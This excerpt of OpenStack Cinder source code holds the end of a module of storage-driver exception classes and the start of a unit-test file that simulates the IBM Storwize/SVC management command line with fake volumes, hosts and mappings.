class Duplicate(CinderException):
    pass


class KeyPairExists(Duplicate):
    message = _(""Key pair %(key_name)s already exists."")


class VolumeTypeExists(Duplicate):
    message = _(""Volume Type %(id)s already exists."")


class MigrationError(CinderException):
    message = _(""Migration error"") + "": %(reason)s""


class MalformedRequestBody(CinderException):
    message = _(""Malformed message body: %(reason)s"")


class ConfigNotFound(NotFound):
    message = _(""Could not find config at %(path)s"")


class ParameterNotFound(NotFound):
    message = _(""Could not find parameter %(param)s"")


class PasteAppNotFound(NotFound):
    message = _(""Could not load paste app '%(name)s' from %(path)s"")


class NoValidHost(CinderException):
    message = _(""No valid host was found. %(reason)s"")


class WillNotSchedule(CinderException):
    message = _(""Host %(host)s is not up or doesn't exist."")


class QuotaError(CinderException):
    message = _(""Quota exceeded"") + "": code=%(code)s""
    code = 413
    headers = {'Retry-After': 0}
    safe = True


class VolumeSizeExceedsAvailableQuota(QuotaError):
    message = _(""Requested volume or snapshot exceeds ""
                ""allowed Gigabytes quota"")


class VolumeSizeExceedsQuota(QuotaError):
    message = _(""Maximum volume/snapshot size exceeded"")


class VolumeLimitExceeded(QuotaError):
    message = _(""Maximum number of volumes allowed (%(allowed)d) exceeded"")


class SnapshotLimitExceeded(QuotaError):
    message = _(""Maximum number of snapshots allowed (%(allowed)d) exceeded"")


class DuplicateSfVolumeNames(Duplicate):
    message = _(""Detected more than one volume with name %(vol_name)s"")


class Duplicate3PARHost(CinderException):
    message = _(""3PAR Host already exists: %(err)s.  %(info)s"")


class Invalid3PARDomain(CinderException):
    message = _(""Invalid 3PAR Domain: %(err)s"")


class VolumeTypeCreateFailed(CinderException):
    message = _(""Cannot create volume_type with ""
                ""name %(name)s and specs %(extra_specs)s"")


class SolidFireAPIException(CinderException):
    message = _(""Bad response from SolidFire API"")


class SolidFireAPIDataException(SolidFireAPIException):
    message = _(""Error in SolidFire API response: data=%(data)s"")


class UnknownCmd(Invalid):
    message = _(""Unknown or unsupported command %(cmd)s"")


class MalformedResponse(Invalid):
    message = _(""Malformed response to command %(cmd)s: %(reason)s"")


class BadHTTPResponseStatus(CinderException):
    message = _(""Bad HTTP response status %(status)s"")


class FailedCmdWithDump(CinderException):
    message = _(""Operation failed with status=%(status)s. Full dump: %(data)s"")


class ZadaraServerCreateFailure(CinderException):
    message = _(""Unable to create server object for initiator %(name)s"")


class ZadaraServerNotFound(NotFound):
    message = _(""Unable to find server object for initiator %(name)s"")


class ZadaraVPSANoActiveController(CinderException):
    message = _(""Unable to find any active VPSA controller"")


class ZadaraAttachmentsNotFound(NotFound):
    message = _(""Failed to retrieve attachments for volume %(name)s"")


class ZadaraInvalidAttachmentInfo(Invalid):
    message = _(""Invalid attachment info for volume %(name)s: %(reason)s"")


class InstanceNotFound(NotFound):
    message = _(""Instance %(instance_id)s could not be found."")


class VolumeBackendAPIException(CinderException):
    message = _(""Bad or unexpected response from the storage volume ""
                ""backend API: %(data)s"")


class NfsException(CinderException):
    message = _(""Unknown NFS exception"")


class NfsNoSharesMounted(NotFound):
    message = _(""No mounted NFS shares found"")


class NfsNoSuitableShareFound(NotFound):
    message = _(""There is no share which can host %(volume_size)sG"")


class GlusterfsException(CinderException):
    message = _(""Unknown Gluster exception"")


class GlusterfsNoSharesMounted(NotFound):
    message = _(""No mounted Gluster shares found"")


class GlusterfsNoSuitableShareFound(NotFound):
    message = _(""There is no share which can host %(volume_size)sG"")


class GlanceMetadataExists(Invalid):
    message = _(""Glance metadata cannot be updated, key %(key)s""
                "" exists for volume id %(volume_id)s"")


class ImageCopyFailure(Invalid):
    message = _(""Failed to copy image to volume: %(reason)s"")


class BackupInvalidCephArgs(Invalid):
    message = _(""Invalid Ceph args provided for backup rbd operation"")


class BackupOperationError(Invalid):
    message = _(""An error has occurred during backup operation"")


class BackupRBDOperationFailed(Invalid):
    message = _(""Backup RBD operation failed"")


class BackupVolumeInvalidType(Invalid):
    message = _(""Backup volume %(volume_id)s type not recognised."")


class BackupNotFound(NotFound):
    message = _(""Backup %(backup_id)s could not be found."")


class InvalidBackup(Invalid):
    message = _(""Invalid backup: %(reason)s"")


class SwiftConnectionFailed(CinderException):
    message = _(""Connection to swift failed"") + "": %(reason)s""


class TransferNotFound(NotFound):
    message = _(""Transfer %(transfer_id)s could not be found."")


class VolumeMigrationFailed(CinderException):
    message = _(""Volume migration failed"") + "": %(reason)s""


class ProtocolNotSupported(CinderException):
    message = _(""Connect to volume via protocol %(protocol)s not supported."")


class SSHInjectionThreat(CinderException):
    message = _(""SSH command injection detected"") + "": %(command)s""
/n/n/ncinder/tests/test_storwize_svc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2013 IBM Corp.
# Copyright 2012 OpenStack LLC.
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
# Authors:
#   Ronen Kat <ronenkat@il.ibm.com>
#   Avishay Traeger <avishay@il.ibm.com>

""""""
Tests for the IBM Storwize family and SVC volume driver.
""""""


import random
import re
import socket

from cinder.brick.initiator import connector
from cinder import context
from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import test
from cinder import units
from cinder import utils
from cinder.volume import configuration as conf
from cinder.volume.drivers import storwize_svc
from cinder.volume import volume_types


LOG = logging.getLogger(__name__)


class StorwizeSVCFakeDB:
    def __init__(self):
        self.volume = None

    def volume_get(self, context, vol_id):
        return self.volume

    def volume_set(self, vol):
        self.volume = vol


class StorwizeSVCManagementSimulator:
    def __init__(self, pool_name):
        self._flags = {'storwize_svc_volpool_name': pool_name}
        self._volumes_list = {}
        self._hosts_list = {}
        self._mappings_list = {}
        self._fcmappings_list = {}
        self._next_cmd_error = {
            'lsportip': '',
            'lsfabric': '',
            'lsiscsiauth': '',
            'lsnodecanister': '',
            'mkvdisk': '',
            'lsvdisk': '',
            'lsfcmap': '',
            'prestartfcmap': '',
            'startfcmap': '',
            'rmfcmap': '',
            'lslicense': '',
        }
        self._errors = {
            'CMMVC5701E': ('', 'CMMVC5701E No object ID was specified.'),
            'CMMVC6035E': ('', 'CMMVC6035E The action failed as the '
                               'object already exists.'),
            'CMMVC5753E': ('', 'CMMVC5753E The specified object does not '
                               'exist or is not a suitable candidate.'),
            'CMMVC5707E': ('', 'CMMVC5707E Required parameters are missing.'),
            'CMMVC6581E': ('', 'CMMVC6581E The command has failed because '
                               'the maximum number of allowed iSCSI '
                               'qualified names (IQNs) has been reached, '
                               'or the IQN is already assigned or is not '
                               'valid.'),
            'CMMVC5754E': ('', 'CMMVC5754E The specified object does not '
                               'exist, or the name supplied does not meet '
                               'the naming rules.'),
            'CMMVC6071E': ('', 'CMMVC6071E The VDisk-to-host mapping was '
                               'not created because the VDisk is already '
                               'mapped to a host.'),
            'CMMVC5879E': ('', 'CMMVC5879E The VDisk-to-host mapping was '
                               'not created because a VDisk is already '
                               'mapped to this host with this SCSI LUN.'),
            'CMMVC5840E': ('', 'CMMVC5840E The virtual disk (VDisk) was '
                               'not deleted because it is mapped to a '
                               'host or because it is part of a FlashCopy '
                               'or Remote Copy mapping, or is involved in '
                               'an image mode migrate.'),
            'CMMVC6527E': ('', 'CMMVC6527E The name that you have entered '
                               'is not valid. The name can contain letters, '
                               'numbers, spaces, periods, dashes, and '
                               'underscores. The name must begin with a '
                               'letter or an underscore. The name must not '
                               'begin or end with a space.'),
            'CMMVC5871E': ('', 'CMMVC5871E The action failed because one or '
                               'more of the configured port names is in a '
                               'mapping.'),
            'CMMVC5924E': ('', 'CMMVC5924E The FlashCopy mapping was not '
                               'created because the source and target '
                               'virtual disks (VDisks) are different sizes.'),
            'CMMVC6303E': ('', 'CMMVC6303E The create failed because the '
                               'source and target VDisks are the same.'),
            'CMMVC7050E': ('', 'CMMVC7050E The command failed because at '
                               'least one node in the I/O group does not '
                               'support compressed VDisks.'),
            # Catch-all for invalid state transitions:
            'CMMVC5903E': ('', 'CMMVC5903E The FlashCopy mapping was not '
                               'changed because the mapping or consistency '
                               'group is another state.'),
        }
        self._transitions = {'begin': {'make': 'idle_or_copied'},
                             'idle_or_copied': {'prepare': 'preparing',
                                                'delete': 'end',
                                                'delete_force': 'end'},
                             'preparing': {'flush_failed': 'stopped',
                                           'wait': 'prepared'},
                             'end': None,
                             'stopped': {'prepare': 'preparing',
                                         'delete_force': 'end'},
                             'prepared': {'stop': 'stopped',
                                          'start': 'copying'},
                             'copying': {'wait': 'idle_or_copied',
                                         'stop': 'stopping'},
                             # Assume the worst case where stopping->stopped
                             # rather than stopping idle_or_copied
                             'stopping': {'wait': 'stopped'},
                             }

    def _state_transition(self, function, fcmap):
        if (function == 'wait' and
                'wait' not in self._transitions[fcmap['status']]):
            return ('', '')

        if fcmap['status'] == 'copying' and function == 'wait':
            if fcmap['copyrate'] != '0':
                if fcmap['progress'] == '0':
                    fcmap['progress'] = '50'
                else:
                    fcmap['progress'] = '100'
                    fcmap['status'] = 'idle_or_copied'
            return ('', '')
        else:
            try:
                curr_state = fcmap['status']
                fcmap['status'] = self._transitions[curr_state][function]
                return ('', '')
            except Exception:
                return self._errors['CMMVC5903E']

    # Find an unused ID
    def _find_unused_id(self, d):
        ids = []
        for k, v in d.iteritems():
            ids.append(int(v['id']))
        ids.sort()
        for index, n in enumerate(ids):
            if n > index:
                return str(index)
        return str(len(ids))

    # Check if name is valid
    def _is_invalid_name(self, name):
        if re.match(""^[a-zA-Z_][\w ._-]*$"", name):
            return False
        return True

    # Convert argument string to dictionary
    def _cmd_to_dict(self, arg_list):
        no_param_args = [
            'autodelete',
            'autoexpand',
            'bytes',
            'compressed',
            'force',
            'nohdr',
        ]
        one_param_args = [
            'chapsecret',
            'cleanrate',
            'copyrate',
            'delim',
            'filtervalue',
            'grainsize',
            'hbawwpn',
            'host',
            'iogrp',
            'iscsiname',
            'mdiskgrp',
            'name',
            'rsize',
            'scsi',
            'size',
            'source',
            'target',
            'unit',
            'easytier',
            'warning',
            'wwpn',
        ]

        # Handle the special case of lsnode which is a two-word command
        # Use the one word version of the command internally
        if arg_list[0] in ('svcinfo', 'svctask'):
            if arg_list[1] == 'lsnode':
                if len(arg_list) > 4:  # e.g. svcinfo lsnode -delim ! <node id>
                    ret = {'cmd': 'lsnode', 'node_id': arg_list[-1]}
                else:
                    ret = {'cmd': 'lsnodecanister'}
            else:
                ret = {'cmd': arg_list[1]}
            arg_list.pop(0)
        else:
            ret = {'cmd': arg_list[0]}

        skip = False
        for i in range(1, len(arg_list)):
            if skip:
                skip = False
                continue
            if arg_list[i][0] == '-':
                if arg_list[i][1:] in no_param_args:
                    ret[arg_list[i][1:]] = True
                elif arg_list[i][1:] in one_param_args:
                    ret[arg_list[i][1:]] = arg_list[i + 1]
                    skip = True
                else:
                    raise exception.InvalidInput(
                        reason=_('unrecognized argument %s') % arg_list[i])
            else:
                ret['obj'] = arg_list[i]
        return ret

    def _print_info_cmd(self, rows, delim=' ', nohdr=False, **kwargs):
        """"""Generic function for printing information.""""""
        if nohdr:
            del rows[0]

        for index in range(len(rows)):
            rows[index] = delim.join(rows[index])
        return ('%s' % '\n'.join(rows), '')

    def _print_info_obj_cmd(self, header, row, delim=' ', nohdr=False):
        """"""Generic function for printing information for a specific object.""""""
        objrows = []
        for idx, val in enumerate(header):
            objrows.append([val, row[idx]])

        if nohdr:
            for index in range(len(objrows)):
                objrows[index] = ' '.join(objrows[index][1:])
        for index in range(len(objrows)):
            objrows[index] = delim.join(objrows[index])
        return ('%s' % '\n'.join(objrows), '')

    def _convert_bytes_units(self, bytestr):
        num = int(bytestr)
        unit_array = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
        unit_index = 0

        while num > 1024:
            num = num / 1024
            unit_index += 1

        return '%d%s' % (num, unit_array[unit_index])

    def _convert_units_bytes(self, num, unit):
        unit_array = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
        unit_index = 0

        while unit.lower() != unit_array[unit_index].lower():
            num = num * 1024
            unit_index += 1

        return str(num)

    def _cmd_lslicense(self, **kwargs):
        rows = [None] * 3
        rows[0] = ['used_compression_capacity', '0.08']
        rows[1] = ['license_compression_capacity', '0']
        if self._next_cmd_error['lslicense'] == 'no_compression':
            self._next_cmd_error['lslicense'] = ''
            rows[2] = ['license_compression_enclosures', '0']
        else:
            rows[2] = ['license_compression_enclosures', '1']
        return self._print_info_cmd(rows=rows, **kwargs)

    # Print mostly made-up stuff in the correct syntax
    def _cmd_lssystem(self, **kwargs):
        rows = [None] * 2
        rows[0] = ['id', '0123456789ABCDEF']
        rows[1] = ['name', 'storwize-svc-sim']
        return self._print_info_cmd(rows=rows, **kwargs)

    # Print mostly made-up stuff in the correct syntax, assume -bytes passed
    def _cmd_lsmdiskgrp(self, **kwargs):
        rows = [None] * 3
        rows[0] = ['id', 'name', 'status', 'mdisk_count',
                   'vdisk_count', 'capacity', 'extent_size',
                   'free_capacity', 'virtual_capacity', 'used_capacity',
                   'real_capacity', 'overallocation', 'warning',
                   'easy_tier', 'easy_tier_status']
        rows[1] = ['1', self._flags['storwize_svc_volpool_name'], 'online',
                   '1', str(len(self._volumes_list)), '3573412790272',
                   '256', '3529926246400', '1693247906775', '277841182',
                   '38203734097', '47', '80', 'auto', 'inactive']
        rows[2] = ['2', 'volpool2', 'online',
                   '1', '0', '3573412790272', '256',
                   '3529432325160', '1693247906775', '277841182',
                   '38203734097', '47', '80', 'auto', 'inactive']
        if 'obj' not in kwargs:
            return self._print_info_cmd(rows=rows, **kwargs)
        else:
            if kwargs['obj'] == self._flags['storwize_svc_volpool_name']:
                row = rows[1]
            elif kwargs['obj'] == 'volpool2':
                row = rows[2]
            else:
                return self._errors['CMMVC5754E']

            objrows = []
            for idx, val in enumerate(rows[0]):
                objrows.append([val, row[idx]])

            if 'nohdr' in kwargs:
                for index in range(len(objrows)):
                    objrows[index] = ' '.join(objrows[index][1:])

            if 'delim' in kwargs:
                for index in range(len(objrows)):
                    objrows[index] = kwargs['delim'].join(objrows[index])

            return ('%s' % '\n'.join(objrows), '')

    # Print mostly made-up stuff in the correct syntax
    def _cmd_lsnodecanister(self, **kwargs):
        rows = [None] * 3
        rows[0] = ['id', 'name', 'UPS_serial_number', 'WWNN', 'status',
                   'IO_group_id', 'IO_group_name', 'config_node',
                   'UPS_unique_id', 'hardware', 'iscsi_name', 'iscsi_alias',
                   'panel_name', 'enclosure_id', 'canister_id',
                   'enclosure_serial_number']
        rows[1] = ['1', 'node1', '', '123456789ABCDEF0', 'online', '0',
                   'io_grp0',
                   'yes', '123456789ABCDEF0', '100',
                   'iqn.1982-01.com.ibm:1234.sim.node1', '', '01-1', '1', '1',
                   '0123ABC']
        rows[2] = ['2', 'node2', '', '123456789ABCDEF1', 'online', '0',
                   'io_grp0',
                   'no', '123456789ABCDEF1', '100',
                   'iqn.1982-01.com.ibm:1234.sim.node2', '', '01-2', '1', '2',
                   '0123ABC']

        if self._next_cmd_error['lsnodecanister'] == 'header_mismatch':
            rows[0].pop(2)
            self._next_cmd_error['lsnodecanister'] = ''
        if self._next_cmd_error['lsnodecanister'] == 'remove_field':
            for row in rows:
                row.pop(0)
            self._next_cmd_error['lsnodecanister'] = ''

        return self._print_info_cmd(rows=rows, **kwargs)

    # Print information of every single node of SVC
    def _cmd_lsnode(self, **kwargs):
        node_infos = dict()
        node_infos['1'] = r'''id!1
name!node1
port_id!500507680210C744
port_status!active
port_speed!8Gb
port_id!500507680220C744
port_status!active
port_speed!8Gb
'''
        node_infos['2'] = r'''id!2
name!node2
port_id!500507680220C745
port_status!active
port_speed!8Gb
port_id!500507680230C745
port_status!inactive
port_speed!N/A
'''
        node_id = kwargs.get('node_id', None)
        stdout = node_infos.get(node_id, '')
        return stdout, ''

    # Print mostly made-up stuff in the correct syntax
    def _cmd_lsportip(self, **kwargs):
        if self._next_cmd_error['lsportip'] == 'ip_no_config':
            self._next_cmd_error['lsportip'] = ''
            ip_addr1 = ''
            ip_addr2 = ''
            gw = ''
        else:
            ip_addr1 = '1.234.56.78'
            ip_addr2 = '1.234.56.79'
            gw = '1.234.56.1'

        rows = [None] * 17
        rows[0] = ['id', 'node_id', 'node_name', 'IP_address', 'mask',
                   'gateway', 'IP_address_6', 'prefix_6', 'gateway_6', 'MAC',
                   'duplex', 'state', 'speed', 'failover']
        rows[1] = ['1', '1', 'node1', ip_addr1, '255.255.255.0',
                   gw, '', '', '', '01:23:45:67:89:00', 'Full',
                   'online', '1Gb/s', 'no']
        rows[2] = ['1', '1', 'node1', '', '', '', '', '', '',
                   '01:23:45:67:89:00', 'Full', 'online', '1Gb/s', 'yes']
        rows[3] = ['2', '1', 'node1', '', '', '', '', '', '',
                   '01:23:45:67:89:01', 'Full', 'unconfigured', '1Gb/s', 'no']
        rows[4] = ['2', '1', 'node1', '', '', '', '', '', '',
                   '01:23:45:67:89:01', 'Full', 'unconfigured', '1Gb/s', 'yes']
        rows[5] = ['3', '1', 'node1', '', '', '', '', '', '', '', '',
                   'unconfigured', '', 'no']
        rows[6] = ['3', '1', 'node1', '', '', '', '', '', '', '', '',
                   'unconfigured', '', 'yes']
        rows[7] = ['4', '1', 'node1', '', '', '', '', '', '', '', '',
                   'unconfigured', '', 'no']
        rows[8] = ['4', '1', 'node1', '', '', '', '', '', '', '', '',
                   'unconfigured', '', 'yes']
        rows[9] = ['1', '2', 'node2', ip_addr2, '255.255.255.0',
                   gw, '', '', '', '01:23:45:67:89:02', 'Full',
                   'online', '1Gb/s', 'no']
        rows[10] = ['1', '2', 'node2', '', '', '', '', '', '',
                    '01:23:45:67:89:02', 'Full', 'online', '1Gb/s', 'yes']
        rows[11] = ['2', '2', 'node2', '', '', '', '', '', '',
                    '01:23:45:67:89:03', 'Full', 'unconfigured', '1Gb/s', 'no']
        rows[12] = ['2', '2', 'node2', '', '', '', '', '', '',
                    '01:23:45:67:89:03', 'Full', 'unconfigured', '1Gb/s',
                    'yes']
        rows[13] = ['3', '2', 'node2', '', '', '', '', '', '', '', '',
                    'unconfigured', '', 'no']
        rows[14] = ['3', '2', 'node2', '', '', '', '', '', '', '', '',
                    'unconfigured', '', 'yes']
        rows[15] = ['4', '2', 'node2', '', '', '', '', '', '', '', '',
                    'unconfigured', '', 'no']
        rows[16] = ['4', '2', 'node2', '', '', '', '', '', '', '', '',
                    'unconfigured', '', 'yes']

        if self._next_cmd_error['lsportip'] == 'header_mismatch':
            rows[0].pop(2)
            self._next_cmd_error['lsportip'] = ''
        if self._next_cmd_error['lsportip'] == 'remove_field':
            for row in rows:
                row.pop(1)
            self._next_cmd_error['lsportip'] = ''

        return self._print_info_cmd(rows=rows, **kwargs)

    def _cmd_lsfabric(self, **kwargs):
        host_name = kwargs['host'] if 'host' in kwargs else None
        target_wwpn = kwargs['wwpn'] if 'wwpn' in kwargs else None
        host_infos = []

        for hk, hv in self._hosts_list.iteritems():
            if not host_name or hv['host_name'] == host_name:
                for mk, mv in self._mappings_list.iteritems():
                    if mv['host'] == hv['host_name']:
                        if not target_wwpn or target_wwpn in hv['wwpns']:
                            host_infos.append(hv)
                            break

        if not len(host_infos):
            return ('', '')

        rows = []
        rows.append(['remote_wwpn', 'remote_nportid', 'id', 'node_name',
                     'local_wwpn', 'local_port', 'local_nportid', 'state',
                     'name', 'cluster_name', 'type'])
        for host_info in host_infos:
            for wwpn in host_info['wwpns']:
                rows.append([wwpn, '123456', host_info['id'], 'nodeN',
                            'AABBCCDDEEFF0011', '1', '0123ABC', 'active',
                            host_info['host_name'], '', 'host'])

        if self._next_cmd_error['lsfabric'] == 'header_mismatch':
            rows[0].pop(0)
            self._next_cmd_error['lsfabric'] = ''
        if self._next_cmd_error['lsfabric'] == 'remove_field':
            for row in rows:
                row.pop(0)
            self._next_cmd_error['lsfabric'] = ''
        return self._print_info_cmd(rows=rows, **kwargs)

    # Create a vdisk
    def _cmd_mkvdisk(self, **kwargs):
        # We only save the id/uid, name, and size - all else will be made up
        volume_info = {}
        volume_info['id'] = self._find_unused_id(self._volumes_list)
        volume_info['uid'] = ('ABCDEF' * 3) + ('0' * 14) + volume_info['id']

        if 'name' in kwargs:
            volume_info['name'] = kwargs['name'].strip('\'\'')
        else:
            volume_info['name'] = 'vdisk' + volume_info['id']

        # Assume size and unit are given, store it in bytes
        capacity = int(kwargs['size'])
        unit = kwargs['unit']
        volume_info['capacity'] = self._convert_units_bytes(capacity, unit)

        if 'easytier' in kwargs:
            if kwargs['easytier'] == 'on':
                volume_info['easy_tier'] = 'on'
            else:
                volume_info['easy_tier'] = 'off'

        if 'rsize' in kwargs:
            # Fake numbers
            volume_info['used_capacity'] = '786432'
            volume_info['real_capacity'] = '21474816'
            volume_info['free_capacity'] = '38219264'
            if 'warning' in kwargs:
                volume_info['warning'] = kwargs['warning'].rstrip('%')
            else:
                volume_info['warning'] = '80'
            if 'autoexpand' in kwargs:
                volume_info['autoexpand'] = 'on'
            else:
                volume_info['autoexpand'] = 'off'
            if 'grainsize' in kwargs:
                volume_info['grainsize'] = kwargs['grainsize']
            else:
                volume_info['grainsize'] = '32'
            if 'compressed' in kwargs:
                volume_info['compressed_copy'] = 'yes'
            else:
                volume_info['compressed_copy'] = 'no'
        else:
            volume_info['used_capacity'] = volume_info['capacity']
            volume_info['real_capacity'] = volume_info['capacity']
            volume_info['free_capacity'] = '0'
            volume_info['warning'] = ''
            volume_info['autoexpand'] = ''
            volume_info['grainsize'] = ''
            volume_info['compressed_copy'] = 'no'

        if volume_info['name'] in self._volumes_list:
            return self._errors['CMMVC6035E']
        else:
            self._volumes_list[volume_info['name']] = volume_info
            return ('Virtual Disk, id [%s], successfully created' %
                    (volume_info['id']), '')

    # Delete a vdisk
    def _cmd_rmvdisk(self, **kwargs):
        force = True if 'force' in kwargs else False

        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        vol_name = kwargs['obj'].strip('\'\'')

        if vol_name not in self._volumes_list:
            return self._errors['CMMVC5753E']

        if not force:
            for k, mapping in self._mappings_list.iteritems():
                if mapping['vol'] == vol_name:
                    return self._errors['CMMVC5840E']
            for k, fcmap in self._fcmappings_list.iteritems():
                if ((fcmap['source'] == vol_name) or
                        (fcmap['target'] == vol_name)):
                    return self._errors['CMMVC5840E']

        del self._volumes_list[vol_name]
        return ('', '')

    def _cmd_expandvdisksize(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        vol_name = kwargs['obj'].strip('\'\'')

        # Assume unit is gb
        if 'size' not in kwargs:
            return self._errors['CMMVC5707E']
        size = int(kwargs['size'])

        if vol_name not in self._volumes_list:
            return self._errors['CMMVC5753E']

        curr_size = int(self._volumes_list[vol_name]['capacity'])
        addition = size * units.GiB
        self._volumes_list[vol_name]['capacity'] = str(curr_size + addition)
        return ('', '')

    def _get_fcmap_info(self, vol_name):
        ret_vals = {
            'fc_id': '',
            'fc_name': '',
            'fc_map_count': '0',
        }
        for k, fcmap in self._fcmappings_list.iteritems():
            if ((fcmap['source'] == vol_name) or
                    (fcmap['target'] == vol_name)):
                ret_vals['fc_id'] = fcmap['id']
                ret_vals['fc_name'] = fcmap['name']
                ret_vals['fc_map_count'] = '1'
        return ret_vals

    # List information about vdisks
    def _cmd_lsvdisk(self, **kwargs):
        rows = []
        rows.append(['id', 'name', 'IO_group_id', 'IO_group_name',
                     'status', 'mdisk_grp_id', 'mdisk_grp_name',
                     'capacity', 'type', 'FC_id', 'FC_name', 'RC_id',
                     'RC_name', 'vdisk_UID', 'fc_map_count', 'copy_count',
                     'fast_write_state', 'se_copy_count', 'RC_change'])

        for k, vol in self._volumes_list.iteritems():
            if (('filtervalue' not in kwargs) or
                    (kwargs['filtervalue'] == 'name=' + vol['name'])):
                fcmap_info = self._get_fcmap_info(vol['name'])

                if 'bytes' in kwargs:
                    cap = self._convert_bytes_units(vol['capacity'])
                else:
                    cap = vol['capacity']
                rows.append([str(vol['id']), vol['name'], '0', 'io_grp0',
                            'online', '0',
                            self._flags['storwize_svc_volpool_name'],
                            cap, 'striped',
                            fcmap_info['fc_id'], fcmap_info['fc_name'],
                            '', '', vol['uid'],
                            fcmap_info['fc_map_count'], '1', 'empty',
                            '1', 'no'])

        if 'obj' not in kwargs:
            return self._print_info_cmd(rows=rows, **kwargs)
        else:
            if kwargs['obj'] not in self._volumes_list:
                return self._errors['CMMVC5754E']
            vol = self._volumes_list[kwargs['obj']]
            fcmap_info = self._get_fcmap_info(vol['name'])
            cap = vol['capacity']
            cap_u = vol['used_capacity']
            cap_r = vol['real_capacity']
            cap_f = vol['free_capacity']
            if 'bytes' not in kwargs:
                for item in [cap, cap_u, cap_r, cap_f]:
                    item = self._convert_bytes_units(item)
            rows = []

            rows.append(['id', str(vol['id'])])
            rows.append(['name', vol['name']])
            rows.append(['IO_group_id', '0'])
            rows.append(['IO_group_name', 'io_grp0'])
            rows.append(['status', 'online'])
            rows.append(['mdisk_grp_id', '0'])
            rows.append([
                'mdisk_grp_name',
                self._flags['storwize_svc_volpool_name']])
            rows.append(['capacity', cap])
            rows.append(['type', 'striped'])
            rows.append(['formatted', 'no'])
            rows.append(['mdisk_id', ''])
            rows.append(['mdisk_name', ''])
            rows.append(['FC_id', fcmap_info['fc_id']])
            rows.append(['FC_name', fcmap_info['fc_name']])
            rows.append(['RC_id', ''])
            rows.append(['RC_name', ''])
            rows.append(['vdisk_UID', vol['uid']])
            rows.append(['throttling', '0'])

            if self._next_cmd_error['lsvdisk'] == 'blank_pref_node':
                rows.append(['preferred_node_id', ''])
                self._next_cmd_error['lsvdisk'] = ''
            elif self._next_cmd_error['lsvdisk'] == 'no_pref_node':
                self._next_cmd_error['lsvdisk'] = ''
            else:
                rows.append(['preferred_node_id', '1'])
            rows.append(['fast_write_state', 'empty'])
            rows.append(['cache', 'readwrite'])
            rows.append(['udid', ''])
            rows.append(['fc_map_count', fcmap_info['fc_map_count']])
            rows.append(['sync_rate', '50'])
            rows.append(['copy_count', '1'])
            rows.append(['se_copy_count', '0'])
            rows.append(['mirror_write_priority', 'latency'])
            rows.append(['RC_change', 'no'])
            rows.append(['used_capacity', cap_u])
            rows.append(['real_capacity', cap_r])
            rows.append(['free_capacity', cap_f])
            rows.append(['autoexpand', vol['autoexpand']])
            rows.append(['warning', vol['warning']])
            rows.append(['grainsize', vol['grainsize']])
            rows.append(['easy_tier', vol['easy_tier']])
            rows.append(['compressed_copy', vol['compressed_copy']])

            if 'nohdr' in kwargs:
                for index in range(len(rows)):
                    rows[index] = ' '.join(rows[index][1:])

            if 'delim' in kwargs:
                for index in range(len(rows)):
                    rows[index] = kwargs['delim'].join(rows[index])

            return ('%s' % '\n'.join(rows), '')

    def _add_port_to_host(self, host_info, **kwargs):
        if 'iscsiname' in kwargs:
            added_key = 'iscsi_names'
            added_val = kwargs['iscsiname'].strip('\'\""')
        elif 'hbawwpn' in kwargs:
            added_key = 'wwpns'
            added_val = kwargs['hbawwpn'].strip('\'\""')
        else:
            return self._errors['CMMVC5707E']

        host_info[added_key].append(added_val)

        for k, v in self._hosts_list.iteritems():
            if v['id'] == host_info['id']:
                continue
            for port in v[added_key]:
                if port == added_val:
                    return self._errors['CMMVC6581E']
        return ('', '')

    # Make a host
    def _cmd_mkhost(self, **kwargs):
        host_info = {}
        host_info['id'] = self._find_unused_id(self._hosts_list)

        if 'name' in kwargs:
            host_name = kwargs['name'].strip('\'\""')
        else:
            host_name = 'host' + str(host_info['id'])

        if self._is_invalid_name(host_name):
            return self._errors['CMMVC6527E']

        if host_name in self._hosts_list:
            return self._errors['CMMVC6035E']

        host_info['host_name'] = host_name
        host_info['iscsi_names'] = []
        host_info['wwpns'] = []

        out, err = self._add_port_to_host(host_info, **kwargs)
        if not len(err):
            self._hosts_list[host_name] = host_info
            return ('Host, id [%s], successfully created' %
                    (host_info['id']), '')
        else:
            return (out, err)

    # Add ports to an existing host
    def _cmd_addhostport(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        host_name = kwargs['obj'].strip('\'\'')

        if host_name not in self._hosts_list:
            return self._errors['CMMVC5753E']

        host_info = self._hosts_list[host_name]
        return self._add_port_to_host(host_info, **kwargs)

    # Change host properties
    def _cmd_chhost(self, **kwargs):
        if 'chapsecret' not in kwargs:
            return self._errors['CMMVC5707E']
        secret = kwargs['obj'].strip('\'\'')

        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        host_name = kwargs['obj'].strip('\'\'')

        if host_name not in self._hosts_list:
            return self._errors['CMMVC5753E']

        self._hosts_list[host_name]['chapsecret'] = secret
        return ('', '')

    # Remove a host
    def _cmd_rmhost(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']

        host_name = kwargs['obj'].strip('\'\'')
        if host_name not in self._hosts_list:
            return self._errors['CMMVC5753E']

        for k, v in self._mappings_list.iteritems():
            if (v['host'] == host_name):
                return self._errors['CMMVC5871E']

        del self._hosts_list[host_name]
        return ('', '')

    # List information about hosts
    def _cmd_lshost(self, **kwargs):
        if 'obj' not in kwargs:
            rows = []
            rows.append(['id', 'name', 'port_count', 'iogrp_count', 'status'])

            found = False
            for k, host in self._hosts_list.iteritems():
                filterstr = 'name=' + host['host_name']
                if (('filtervalue' not in kwargs) or
                        (kwargs['filtervalue'] == filterstr)):
                    rows.append([host['id'], host['host_name'], '1', '4',
                                'offline'])
                    found = True
            if found:
                return self._print_info_cmd(rows=rows, **kwargs)
            else:
                return ('', '')
        else:
